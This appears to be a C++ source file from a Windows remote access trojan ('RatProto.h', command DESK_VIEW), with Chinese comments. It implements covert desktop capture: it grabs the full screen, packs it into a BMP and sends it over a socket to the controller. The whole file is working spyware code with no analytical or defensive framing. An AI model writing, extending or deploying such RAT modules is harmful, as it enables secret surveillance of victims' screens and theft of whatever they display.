#include "Header.h"
#include "RatProto.h"
//////////////////////////////////////////////////////////////////////////
//远程桌面捕获
BOOL DeskView(SOCKET sockfd){
	HBITMAP hBitmap = CapScreen();//获取屏幕截图
	HDC hDC = CreateDC("DISPLAY",NULL,NULL,NULL); //颜色平面数×色彩位数 = 当前分辨率下每个像素所占字节数  
	int iBits = GetDeviceCaps(hDC, BITSPIXEL) *GetDeviceCaps(hDC, PLANES);  
	DeleteDC(hDC);
	WORD   wBitCount;   //位图中每个像素所占字节数    
	if (iBits <= 1)
		wBitCount = 1;
	else if (iBits <= 4)
		wBitCount = 4;
	else if (iBits <= 8)
		wBitCount = 8;
	else if (iBits <= 24)
		wBitCount = 24;
	else
		wBitCount = iBits;
	//调色板大小， 位图中像素字节大小
	DWORD   dwPaletteSize=0;	 
	if (wBitCount <= 8)		
		dwPaletteSize = (1 << wBitCount) *	sizeof(RGBQUAD);	
	
	
	BITMAP  bm;    //位图属性结构    
	GetObject(hBitmap, sizeof(bm), (LPSTR)&bm);  

	BITMAPINFOHEADER   bi,bi1;    //位图信息头结构        
	bi.biSize = sizeof(BITMAPINFOHEADER);  
	bi.biWidth= bm.bmWidth;
	bi.biHeight = bm.bmHeight;
	bi.biPlanes= 1;
	bi.biBitCount = wBitCount;
	bi.biCompression = BI_RGB; //没有压缩
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter  = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant= 0;
	bi1=bi;
	bi1.biBitCount=24;

	DWORD dwBmBitsSize = ((bm.bmWidth * wBitCount+31)/32) * 4 * bm.bmHeight;    //为位图内容分配内存
	HANDLE hDib  = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  
	LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;// 处理调色板
	HANDLE hPal = GetStockObject(DEFAULT_PALETTE);   
	HANDLE  hOldPal=NULL; 
	if (hPal){
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC,(HPALETTE)hPal, FALSE);
		RealizePalette(hDC);
	}
	int nOutputBytes = 0;
	unsigned char *pJpp,*m_pDibBits;
	pJpp = new unsigned char [dwBmBitsSize];
	m_pDibBits = new unsigned char [dwBmBitsSize];
	GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,
		(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);// 获取该调色板下新的像素值
	if (hOldPal){//恢复调色板
		SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
		RealizePalette(hDC);
		ReleaseDC(NULL, hDC);
	}

	BITMAPFILEHEADER   bmfHdr;    //位图文件头结构  
	bmfHdr.bfType = 0x4D42;  // "BM"  
	DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;  // 设置位图文件头
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
	RatProto ratPro;
	ratPro.RatId = DESK_VIEW;
	ratPro.RatLen = sizeof(BITMAPFILEHEADER)+sizeof(RatProto)+dwDIBSize;
	
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));//发送协议头
	SendCmd(sockfd,(char*)(&bmfHdr),sizeof(BITMAPFILEHEADER));//发送BMP头
	SendCmd(sockfd,(char*)lpbi,dwDIBSize);//发送BMP内容
	GlobalUnlock(hDib);   //清除   
	GlobalFree(hDib);
	delete []pJpp;
	delete []m_pDibBits;
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//截图
HBITMAP CapScreen(){
	HWND hDesk = GetDesktopWindow();//桌面HWND
	HDC hScreenDC = GetDC(hDesk);//桌面HDC
	HDC hMemDc = CreateCompatibleDC(hScreenDC);//CreateCompatibleDC创建一个临时DC
	RECT stRect;
	GetWindowRect(hDesk,&stRect);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,stRect.right-stRect.left,stRect.bottom-stRect.top);
	HGDIOBJ hOldBmp =  SelectObject(hMemDc,hBitmap);
	BitBlt(hMemDc,0,0,stRect.right-stRect.left,stRect.bottom-stRect.top,hScreenDC,stRect.left,stRect.top,SRCCOPY);
	SelectObject(hMemDc,hOldBmp);
	DeleteObject(hMemDc);
	ReleaseDC(hDesk,hScreenDC);
	return hBitmap;
}